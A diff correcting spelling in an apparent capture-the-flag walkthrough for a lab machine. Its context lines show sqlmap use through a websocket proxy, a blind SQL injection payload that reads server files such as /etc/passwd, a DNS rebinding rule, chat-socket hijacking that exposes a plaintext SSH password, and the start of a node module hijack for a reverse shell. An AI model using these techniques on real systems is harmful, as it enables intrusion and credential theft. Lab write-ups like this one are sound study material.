@@ -117,9 +117,9 @@ While testing `params` parameter found sql injections.
 
 ### websocket client mitm server
 
-Creating a php server based websocket client so we can automate sql injetion with sqlmap.
+Creating a php server based websocket client so we can automate sql injection with sqlmap.
 
-* There is a library **[`textalk/websocket`](https://github.com/Textalk/websocket-php)**, We can use for websockets in php.
+* There is a library **[`textalk/websocket`](https://github.com/Textalk/websocket-php)**, We can use for websocket in php.
 
 Install it in project folder
 ```php
@@ -153,7 +153,7 @@ $client->close();
 
 And now we can use sqlmap to automate sql injection.
 
-Some sqlmap flags to make scan more acurate based on known information.
+Some sqlmap flags to make scan more accurate based on known information.
 ```bash
 --technique=TECH..  SQL injection techniques to use (default "BEUSTQ")
 --string=STRING     String to match when query is evaluated to True
@@ -195,7 +195,7 @@ database management system users privileges:
 
 * From mysql docs "A user who has the **FILE privilege** can read any file on the server host that is either world-readable or readable by the MySQL server."
 
-* sql payload for boolen based blind injection for checking if file exixt: **`1 AND !isnull(load_file(0x<filepath_in_hexadecimal>))`**
+* sql payload for boolean based blind injection for checking if file exist: **`1 AND !isnull(load_file(0x<filepath_in_hexadecimal>))`**
 
 Check `/etc/passwd` file
 ```bash
@@ -213,7 +213,7 @@ sqlmap -u 'http://10.10.15.71:8000/websocket-client.php?id=1' --batch --string='
 
 * Found injection with payload: `3 UNION SELECT 1,2`
 
-This is more faster than blind injection because values are reflacted in the response.
+This is more faster than blind injection because values are reflected in the response.
 
 **Updated Websocket client python script**
 
@@ -292,7 +292,7 @@ While checking conf files, one interesting file found is httpd server.
 
 * OpenBSD httpd server config file default path is `/etc/httpd.conf`
 
-host/subdomains listening on diffrent local port but we can access them from remote port 80.
+host/subdomains listening on different local port but we can access them from remote port 80.
 ```bash
 ❯ python websocket.py -f -p "/etc/httpd.conf"
 
@@ -458,12 +458,12 @@ Basic motive of dns rebinding is that the server accepts a certain number of req
 
 `dnschef` don't have dns rebinding feature but there is a python script on github [FakeDns](https://github.com/Crypt0s/FakeDns) that can help in this situation.
 
-Create confing file for `FakeDns` with a dns rebind rule.
+Create config file for `FakeDns` with a dns rebind rule.
 ```bash
 A ex-employees.crossfit.htb 127.0.0.1 2%10.10.15.71
 ```
 
-We add 2 before `%` that menas that server takes 2 request on IP `127.0.0.1` and then change IP to `10.10.15.71`.
+We add 2 before `%` that means that server takes 2 request on IP `127.0.0.1` and then change IP to `10.10.15.71`.
 
 And this time get request on http server and get reset link.
 
@@ -487,7 +487,7 @@ And there is a signup option, That is disabled.
 
 ![](screenshots/signup-disable.png)
 
-Found 2 endpoints from api fuzzing with GET methond and 2 from POST method.
+Found 2 endpoints from api fuzzing with GET method and 2 from POST method.
 
 ```bash
 ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u http://crossfit-club.htb/api/FUZZ
@@ -502,7 +502,7 @@ login                   [Status: 200, Size: 50, Words: 3, Lines: 1]
 signup                  [Status: 200, Size: 50, Words: 3, Lines: 1]
 ```
 
-`auth` response with a tokem
+`auth` response with a token
 
 ![](screenshots/api-auth.png)
 
@@ -639,7 +639,7 @@ else:
     exit()
 ```
 
-### Socket.io listener hooing
+### Socket.io listener hooking
 
 After login to `crossfit-club.htb` found only functional page `chat`
 
@@ -686,7 +686,7 @@ socket.on("private_recv", function(msg) {
 </html>
 ```
 
-after some time, receive message with user "David" ssh passowrd
+after some time, receive message with user "David" ssh password
 
 ![](screenshots/ssh-password.png)
 <!--david:NWBFcSe3ws4VDhTB-->
@@ -708,7 +708,7 @@ Find a javascript file inside `/opt/sysadmin/server/statbot`
 -rw-r--r--  1 root  wheel  740 Jan 13  2021 statbot.js`
 ```
 
-* script is executing every minute and loging data in `/tmp/chatbot.log`
+* script is executing every minute and logging data in `/tmp/chatbot.log`
 
 ## Node module hijack
 
@@ -726,7 +726,7 @@ Get nodejs reverse shell from [PayloadsAllTheThings](https://github.com/swisskyr
 
 user "david" have write access in `/opt/sysadmin` directory.
 
-Create recursive directry `node_modules/ws/` and inside this folder create `index.js` file with reverse shell.
+Create recursive directly `node_modules/ws/` and inside this folder create `index.js` file with reverse shell.
 
 ```bash
 mkdir -p /opt/sysadmin/node_modules/ws/
